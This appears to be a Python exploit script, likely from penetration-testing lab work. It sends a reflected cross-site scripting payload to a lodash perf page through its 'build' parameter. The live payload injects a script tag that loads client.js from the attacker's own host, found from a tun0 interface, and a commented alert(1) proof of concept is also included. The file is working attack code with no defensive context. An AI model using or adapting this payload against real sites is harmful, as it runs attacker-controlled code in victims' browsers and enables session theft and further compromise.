import sys, re, os
import requests
import subprocess
import base64
import json
requests.packages.urllib3.disable_warnings()
from urllib.parse import quote

def send_xss(ip, LHOST):
	target = f"https://{ip}/js/vendor/lodash/perf/index.html"
	# POC Payload:
	# payload = "\"></script><script>alert(1)</script><script src=\""
	payload = f"\"></script><script src=\"https://{LHOST}:443/client.js\"></script><script src=\""

	encoded_payload = quote(payload)
	target += f"?build={encoded_payload}"
	print("XSS Payload:")
	print(target)
	r = requests.get(target,verify=False)

	# Attempt at dynamically verifying if XSS is working
	# from requests_html import HTMLSession
	# session = HTMLSession(verify=False) # https://stackoverflow.com/questions/51762655/how-to-ignore-an-invalid-ssl-certificate-with-requests-html
	# r = session.get(target)
	# # print(r.text)
	# r.html.render()

	# print(r.text)

def main():
	if len(sys.argv) != 2:
		print ("(+) usage: %s <target>" % sys.argv[0])
		print ('(+) eg: %s 192.168.121.103'  % sys.argv[0])
		sys.exit(-1)

	ip = sys.argv[1]
	LHOST = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0]

	send_xss(ip, LHOST)

if __name__ == '__main__':
	main()